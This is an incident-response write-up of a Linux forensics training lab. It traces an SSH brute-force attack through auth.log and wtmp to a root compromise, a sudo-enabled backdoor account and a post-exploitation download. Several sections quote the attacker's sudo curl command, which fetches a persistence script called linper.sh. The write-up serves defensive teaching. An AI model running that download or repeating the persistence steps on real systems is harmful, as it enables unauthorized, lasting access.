# Brutus Lab – SSH Brute-Force Attack Investigation

## 1. Introduction
The Brutus Lab is a cybersecurity investigation focused on identifying and analyzing a brute-force attack against an SSH service on a Linux server.

The investigation demonstrates how authentication logs and system login records can be used to identify brute-force activity, determine whether the attack was successful, establish the attacker's interactive session, identify persistence mechanisms, and understand post-exploitation activity.

The investigation primarily uses two important Linux artifacts:

- auth.log

- wtmp

The scenario involves an attacker who brute-forced an SSH service, successfully compromised the root account, established an interactive session, created a new privileged account for persistence, and later used that account to download an additional script.

The official write-up identifies the lab as Very Easy and lists Unix log analysis, WTMP analysis, brute-force activity analysis, timeline creation, contextual analysis, and post-exploitation analysis as the main skills demonstrated.

## 2. Objectives
The main objectives of this investigation were:
1. Identify the IP address responsible for the SSH brute-force attack.
2. Determine whether the brute-force attack was successful.
3. Identify the compromised account.
4. Determine when the attacker established an interactive terminal session.
5. Identify the SSH session number associated with the attacker.
6. Identify any persistence mechanism created by the attacker.
7. Map the persistence technique to MITRE ATT&CK.
8. Determine when the attacker's first SSH session ended.
9. Identify commands executed by the attacker after gaining access.
10. Build a timeline of the attacker's activities.

## 3. Scenario
The investigation concerns a Linux server that was targeted through its SSH service.

The attacker initially performed repeated authentication attempts against the SSH service. After successfully obtaining valid credentials, the attacker gained access to the server using the root account.

After obtaining access, the attacker performed additional activities on the compromised system. These activities included establishing an interactive terminal session, creating a new user account with elevated privileges, and downloading a script using sudo.

The available artifacts were the Linux authentication logs and WTMP data.

## 4. Evidence / Artifacts
The investigation was based on the following artifacts.

### 4.1 Authentication Log – auth.log
The auth.log file records authentication-related events on a Linux system.

It can contain information related to:
- SSH authentication
- Successful logins
- Failed login attempts
- Invalid users
- sudo activity
- User switching
- Authentication-related system activity

Typical fields include:
- Date and time
- Hostname
- Service
- Process ID
- Username
- Authentication status
- Source IP address
- Message/details

The official write-up explains that auth.log is particularly useful for identifying repeated failed authentication attempts and investigating SSH brute-force activity.

### 4.2 WTMP
The wtmp artifact records login and logout activity on Linux systems.

It is a binary file normally located at: /var/log/wtmp

The last command can be used to interpret WTMP information.

Important information available through WTMP includes:
- Username
- Terminal
- Source IP address/hostname
- Login time
- Logout time
- Session duration

Because WTMP is a binary artifact, specialized utilities may be required to decode it. The official write-up describes the use of utmp.py to convert the WTMP data into a human-readable format.

The write-up provides the following example command: python3 utmp.py -o wtmp.out wtmp

The resulting output can then be examined using tools such as cat or less.

## 5. Tools Used
The investigation used the following tools and techniques:

| Tool / Artifact | Purpose |
| --- | --- |
| auth.log | Analyze authentication activity and SSH brute-force attempts |
| wtmp | Investigate login sessions and interactive terminal activity |
| last | Read WTMP login/logout information |
| utmp.py | Decode WTMP data into human-readable output |
| cat / less | Review decoded log data |
| MITRE ATT&CK | Map attacker behavior to a recognized technique |
| Text editor | Review authentication logs |
| Timeline analysis | Correlate authentication and session events |

The official write-up specifically identifies Unix log analysis, WTMP analysis, brute-force analysis, timeline creation, contextual analysis, and post-exploitation analysis as the skills involved in the lab.

## 6. Investigation Methodology
The investigation followed a log-analysis approach.

The general process was:

Collect Evidence

↓

Analyze auth.log

↓

Identify Repeated SSH Failures

↓

Identify Attacker IP

↓

Find Successful Authentication

↓

Identify Compromised Account

↓

Analyze WTMP

↓

Identify Interactive Session

↓

Correlate Session Number

↓

Investigate Persistence

↓

Identify New Privileged Account

↓

Map Activity to MITRE ATT&CK

↓

Analyze Post-Exploitation Activity

↓

Build Attack Timeline

## 7. Analysis of SSH Brute-Force Activity
The first stage was to analyze the authentication log for repeated failed SSH authentication attempts.

A brute-force attack can be identified by looking for repeated entries such as:

- Invalid user

- Failed password

When many authentication attempts originate from the same IP address within a short period, the activity becomes suspicious.

The official write-up states that numerous attempts were observed from: 65.2.161.68

The timestamps of the attempts occurred within seconds of one another, which is consistent with automated brute-force behavior rather than normal human authentication activity.

### Finding
**Attacker IP Address:**

65.2.161.68

This IP address was identified as the source of the SSH brute-force attack.

## 8. Successful Brute-Force Authentication
After identifying the source of the brute-force attack, the next step was determining whether the attacker successfully obtained access.

A successful SSH authentication can be identified in auth.log through the presence of:

**Accepted password**

The investigation confirmed that the brute-force activity resulted in successful authentication to the root account.

This is significant because root is the most privileged account on the Linux system.

### Finding
**Compromised Account:**

root

The official investigation confirms that the root account was successfully authenticated during the bruteforce activity.

## 9. Establishing the Interactive Session
Authentication time and interactive terminal session time are not necessarily identical.

The auth.log records the authentication event, while WTMP can be used to identify the creation of an interactive terminal session.

The investigation showed that the attacker authenticated using the root account at: 06:32:44

The WTMP artifact showed that the interactive terminal session was established at: 06:32:45

The system timezone was UTC, so no timezone conversion was required.

### Finding
**Attacker's interactive login time:**

2024-03-06 06:32:45 UTC

The WTMP artifact was therefore used as the authoritative source for the interactive session timestamp.

## 10. SSH Session Number
SSH login sessions are assigned session numbers that can be correlated within the authentication logs.

The investigation identified the attacker's session number as:

37

### Finding
**SSH Session Number:**

37

This session corresponds to the attacker's login using the compromised root account.

## 11. Persistence Mechanism
After obtaining access, the attacker created a new user account.

Creating a new account is a common persistence technique because it allows an attacker to maintain access even if the original compromised credentials are changed or the initial session is terminated.

The authentication logs showed activity involving:

- useradd
- usermod
- groupadd

These commands can provide evidence of account creation and privilege modification.

The investigation identified a new user named:

**cyberjunkie**

The account was subsequently added to the sudo group.

Membership in the sudo group allows the user to execute commands with elevated administrative privileges.

### Finding
**Persistence Account:**

cyberjunkie

**Privilege:**

sudo / elevated privileges

The official write-up confirms that the attacker created the cyberjunkie account and added it to the sudo group.

## 12. MITRE ATT&CK Mapping
The creation of a new local account for persistence can be mapped to the MITRE ATT&CK framework.

The parent technique is:

**T1136 – Create Account**

Because the investigation identified the account as a local account, the appropriate sub-technique is:

**T1136.001 – Create Account: Local Account**

### Finding
**MITRE ATT&CK Sub-Technique:**

T1136.001

This represents the creation of a local account as a persistence mechanism.

## 13. Termination of the First SSH Session
The investigation then examined the termination of the attacker's first SSH session.

The session number identified earlier was:

37

The authentication logs showed that this session ended at:

06:37:24

### Finding
**First SSH session termination:**

2024-03-06 06:37:24 UTC

This corresponds to the closing of session 37.

## 14. Post-Exploitation Activity
The attacker later logged into the newly created backdoor account and used its elevated privileges to download an additional script.

Although auth.log is primarily an authentication log, commands executed using sudo can be recorded because they require authentication.

The investigation identified the following command:

/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

The command uses curl to download a shell script from a GitHub repository.

This activity demonstrates that the attacker progressed beyond initial access and began performing postexploitation actions.

### Finding
**Command executed with sudo:**

/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

The official write-up states that this activity indicated an intention to deploy additional tools or malware for further exploitation or persistence.

## 15. Attack Timeline
The investigation can be summarized into the following timeline.

| Time / Date | Event |
| --- | --- |
| 2024-03-06 | SSH brute-force activity observed |
| Before 06:32:44 | Multiple SSH authentication attempts from 65.2.161.68 |
| 06:32:44 | Successful authentication to the root account |
| 06:32:45 | Interactive terminal session established |
| 06:32:45 | Attacker's session identified as session 37 |
| After initial access | New account cyberjunkie created |
| After account creation | cyberjunkie added to sudo group |
| 06:37:24 | First SSH session, session 37, terminated |
| Later | Attacker logged into the backdoor account |
| Later | Attacker used sudo to execute curl and download linper.sh |

## 16. Indicators of Compromise (IOC)
The investigation identified the following important indicators.

### 16.1 Source IP
65.2.161.68

This IP was responsible for the observed SSH brute-force activity.

### 16.2 Compromised Account
root

The root account was successfully accessed through the brute-force attack.

### 16.3 Persistence Account
cyberjunkie

A new local account was created and given sudo privileges.

### 16.4 Downloaded Resource
https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

This resource was downloaded using curl with elevated privileges.

## 17. Key Findings
The investigation produced the following findings:

| Question | Finding |
| --- | --- |
| Attacker IP | 65.2.161.68 |
| Compromised account | root |
| Interactive login | 2024-03-06 06:32:45 UTC |
| SSH session number | 37 |
| Persistence account | cyberjunkie |
| Persistence technique | Local account creation |
| MITRE ATT&CK | T1136.001 |
| First session ended | 2024-03-06 06:37:24 UTC |
| Post-exploitation command | /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh |

## 18. Security Impact
The attack resulted in the compromise of the root account, which represents a critical security impact.

The attacker was able to:
1. Perform repeated SSH authentication attempts.
2. Successfully obtain root access.
3. Establish an interactive terminal session.
4. Create a new user account.
5. Grant the new account elevated sudo privileges.
6. Maintain a potential alternative method of access.
7. Download an additional script using elevated privileges.

The combination of root compromise and persistence significantly increases the risk to the affected system.

## 19. Detection Opportunities
The investigation demonstrates several opportunities for detecting similar attacks.

### SSH Brute Force
Security monitoring should alert when a single source IP generates a large number of failed SSH authentication attempts within a short period.

Potential indicators include:

**Multiple "Failed password" events**

**Multiple "Invalid user" events**

**Same source IP**

**Short time interval**

### Successful Login After Brute Force
A successful:

Accepted password

event following numerous failed authentication attempts should be treated as high priority.

### Suspicious Root Login
Direct SSH access to the root account should be monitored because compromise of root provides extensive privileges.

### New User Creation
Unexpected useradd, usermod, or groupadd activity should be investigated, especially when a new account is granted sudo privileges.

### Suspicious sudo Commands
Commands executed using sudo, particularly commands that download remote scripts, should be reviewed.

## 20. Lessons Learned
This lab demonstrated the importance of Linux authentication artifacts during incident response.

The main lessons learned were:

- auth.log can reveal SSH brute-force activity.
- Repeated authentication failures can help identify automated attacks.
- Source IP correlation is useful when investigating brute-force activity.
- Accepted password can indicate successful authentication.
- WTMP provides valuable information about interactive login sessions.
- Authentication time and terminal session time may differ.
- Attackers may create new accounts for persistence.
- Sudo privileges can provide attackers with continued elevated access.
- Authentication logs can sometimes provide visibility into commands executed through sudo.
- MITRE ATT&CK can be used to map observed attacker behavior to standardized techniques.

## 21. Conclusion
The Brutus investigation demonstrated a complete attack progression from initial SSH brute-force activity to successful compromise and post-exploitation.

The attack originated from: 65.2.161.68

The attacker successfully compromised the: root

account and established an interactive session at: 2024-03-06 06:32:45 UTC

The associated SSH session number was: 37

The attacker subsequently created a new account: cyberjunkie

and added it to the sudo group, providing a persistence mechanism mapped to: T1136.001 – Create Account: Local Account

The first SSH session ended at: 2024-03-06 06:37:24 UTC

The attacker later used the privileged account to execute: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

Overall, the investigation demonstrates how combining auth.log and WTMP artifacts can provide a detailed understanding of an SSH compromise, including initial access, successful authentication, interactive sessions, persistence, and post-exploitation activity.
